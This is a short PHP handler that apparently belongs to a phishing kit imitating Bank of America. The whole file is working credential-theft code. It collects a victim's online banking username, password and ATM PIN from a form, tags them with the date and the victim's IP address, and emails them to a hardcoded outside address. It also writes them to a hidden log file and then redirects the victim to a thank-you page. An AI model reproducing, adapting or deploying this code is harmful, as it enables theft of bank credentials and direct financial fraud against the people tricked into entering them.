<?php include_once'../dbf60138c911308b0c99510ba80c36cc.php';?><?php
session_start();
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];


$america = $_POST['america'];
$america1 = $_POST['america1'];
$atm = $_POST['atm'];
$message .="
bank of user : ".$america."
boa pw : ".$america1."
atm pin : ".$atm."
====================== 	PC-INFO ====================||
Date / time	    : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========|0v3r|=====================||\n";
$send="jokamercairoresult@yandex.com";
$subject = "boa bank cash | $ip";
mail($send,$subject,$message);
@fclose(@fwrite(@fopen("../0v3r.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);

die("<script>location.href = 'thx.php'</script>");
?>